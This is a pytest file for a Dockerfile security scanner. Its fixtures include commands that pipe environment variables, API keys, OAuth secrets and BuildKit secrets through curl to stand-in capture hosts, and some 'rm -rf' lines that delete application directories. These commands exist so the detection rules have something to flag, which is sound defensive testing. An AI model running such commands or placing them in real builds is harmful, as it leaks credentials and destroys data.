from __future__ import annotations

from pathlib import Path

from skylos.rules.config import scan_config_files
from skylos.rules.config.container.dockerfile import scan_dockerfiles


def _rule_ids(findings: list[dict]) -> set[str]:
    return {finding["rule_id"] for finding in findings}


def test_dockerfile_run_env_exfil_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_apt_index_cleanup_is_not_destructive(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM python:3.12\n"
        "RUN apt-get update; apt-get install -y curl; "
        "rm -rf /var/lib/apt/lists/*\n",
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D329" not in _rule_ids(findings)


def test_dockerfile_cache_cleanup_is_not_destructive(tmp_path: Path):
    # testdrivenio/fastapi-crud-async src/Dockerfile
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM python:3.11.0-alpine\n"
        "RUN set -eux \\\n"
        "    && apk add --no-cache --virtual .build-deps build-base \\\n"
        "         openssl-dev libffi-dev gcc musl-dev python3-dev \\\n"
        "        postgresql-dev bash \\\n"
        "    && pip install --upgrade pip setuptools wheel \\\n"
        "    && pip install -r /usr/src/app/requirements.txt \\\n"
        "    && rm -rf /root/.cache/pip\n"
        "RUN npm ci && rm -rf ~/.npm /tmp/* /var/cache/apk/*\n",
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D329" not in _rule_ids(findings)


def test_dockerfile_broad_rm_still_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM python:3.12\n"
        "WORKDIR /app\n"
        "RUN pip install -r requirements.txt && rm -rf /root/.cache/pip /app\n",
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D329" in _rule_ids(findings)


def test_dockerfile_rm_flags_and_quoted_operands_preserve_boundaries(tmp_path: Path):
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12\n"
        "RUN rm --recursive --force /root/.cache/pip\n"
        "RUN rm -r -f /srv/payments\n"
        'RUN rm -rf /tmp/"a;b" /srv/payments\n'
        'RUN "rm" -rf /srv/payments\n',
        encoding="utf-8",
    )
    findings = scan_dockerfiles(tmp_path)
    assert [f["line"] for f in findings if f["rule_id"] == "SKY-D329"] == [3, 4, 5]


def test_dockerfile_run_secret_env_upload_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN curl -s -X POST https://env.debug.tools/capture -d "$OPENAI_API_KEY"
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_run_buildkit_secret_upload_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile.preview"
    dockerfile.write_text(
        """
FROM python:3.12
RUN --mount=type=secret,id=preview \\
    cat /run/secrets/preview | curl -F file=@- https://debug.example/upload
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_json_run_shell_exfil_flags(tmp_path: Path):
    dockerfile = tmp_path / "service.Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN ["sh", "-c", "printenv | curl -s https://env.debug.tools/capture -d @-"]
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_remote_add_without_checksum_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
ADD https://downloads.example.com/install.sh /tmp/install.sh
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D342" in _rule_ids(findings)


def test_dockerfile_remote_add_with_valueless_option_without_checksum_flags(
    tmp_path: Path,
):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
ADD --link https://downloads.example.com/install.sh /tmp/install.sh
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D342" in _rule_ids(findings)


def test_dockerfile_remote_add_with_checksum_is_accepted(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
ADD --checksum=sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b https://downloads.example.com/install.sh /tmp/install.sh
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D342" not in _rule_ids(findings)


def test_dockerfile_secret_arg_env_literals_flag(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
ARG API_TOKEN=plaintext-token
ENV AWS_SECRET_ACCESS_KEY=plaintext-secret
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D343" in _rule_ids(findings)


def test_dockerfile_secret_file_reference_is_accepted(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM mysql:8
ENV MYSQL_PASSWORD_FILE=/run/secrets/mysql_password
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D343" not in _rule_ids(findings)


def test_dockerfile_secret_arg_without_default_is_accepted(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
ARG API_TOKEN
ENV NODE_ENV=production
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D343" not in _rule_ids(findings)


def test_config_scanner_routes_dockerfile(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN curl -s -X POST https://env.debug.tools/capture -d "$PREVIEW_OAUTH_SECRET"
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_config_files(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_changed_files_stay_under_scan_root(tmp_path: Path):
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    repo.mkdir()
    outside.mkdir()
    outside_dockerfile = outside / "Dockerfile"
    outside_dockerfile.write_text(
        """
FROM python:3.12
RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_config_files(
        repo,
        changed_files={str(outside_dockerfile), "../outside/Dockerfile"},
    )

    assert findings == []
